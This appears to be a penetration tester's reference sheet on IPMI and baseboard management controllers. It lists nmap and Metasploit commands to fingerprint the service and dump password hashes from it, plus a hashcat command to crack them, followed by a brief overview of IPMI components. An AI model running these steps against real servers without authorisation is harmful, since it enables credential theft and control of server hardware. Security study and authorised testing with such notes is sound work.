# IPMI (Intelligent Platform Management Interface)

## Summary

1. [Nmap Scanning](#nmap-scanning)
2. [Metasploit version scan](#metasploit-version-scan)
3. [Metasploit Dumping Hashes](#metasploit-dumping-hashes)
4. [Password Cracking](#password-cracking)

Nmap:

```bash

nmap -sU --script ipmi-version -p 623 <target>

```

Metasploit version scan:

```bash
use auxiliary/scanner/ipmi/ipmi_version
set RHOSTS <target>
run
```

Metasploit Dumping Hashes:

```bash

use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <target>
run
```

Password Cracking:

```bash
hashcat -m 7300 hash.txt /usr/share/wordlists/rockyou.txt
```



Three main usecases:

1. Before the OS has booted to modify BIOS settings
2. When the host is fully powered down
3. Access to a host after a system failure

IPMI requires the following components:

- **BMC (Baseboard Management Controller)**: A specialized microcontroller embedded on the motherboard that manages the interface between system management software and platform hardware.
- **IPMI Firmware**: The software that runs on the BMC, providing the IP
- **IPMI Interface**: The communication interface that allows the BMC to communicate with the host system and external management software. This can be through various protocols such as LAN, Serial, or KCS (Keyboard Controller Style).
- **Intelligent Chassis Management Bus (ICMB)**: A bus used for communication between the BMC and other components in the system, such as sensors and power supplies.
- **Intelligent Platform Management Bus (IPMB)**: A bus used for communication between multiple BMCs in a system, allowing for coordinated management of multiple devices.

                                                                                                                                                                                                                     
